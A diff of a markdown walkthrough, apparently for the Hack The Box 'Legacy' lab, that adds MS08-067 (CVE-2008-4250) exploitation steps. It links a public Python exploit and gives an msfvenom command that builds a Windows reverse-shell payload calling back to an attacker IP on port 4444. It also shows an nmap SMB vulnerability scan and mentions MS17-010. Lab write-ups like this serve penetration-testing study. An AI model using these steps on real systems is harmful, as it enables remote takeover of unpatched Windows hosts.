@@ -33,7 +33,10 @@ nmap --script smb-vuln* -p 139,445 10.10.10.4
 
 
 ## Exploitation & Gaining Access & Privilege Escalation
-+ ms08-067: CVE-2008-4250
+
+### Method 1: [CVE-2008-4250 (ms08-067) / Conficker](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html#ms-08-067)
++ Download python exploit from **ms08-067: CVE-2008-4250** [1](https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py) [2](https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py)
++ Take this shellcode into the script, and replace it with the default.
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -v shellcode -a x86 --platform windows -o shellcode.txt
@@ -73,7 +76,10 @@ smbserver.py win /usr/share/windows-binaries/
 
 
 ## CVE Scripting
-+ x
++ **CVE-2008-4250 (ms08-067) / Conficker:**
+  + https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py
+  + https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py
++ **CVE-2017-0143 (ms17-010) / Shadow Brokers:** 
 
 
 ## Tools
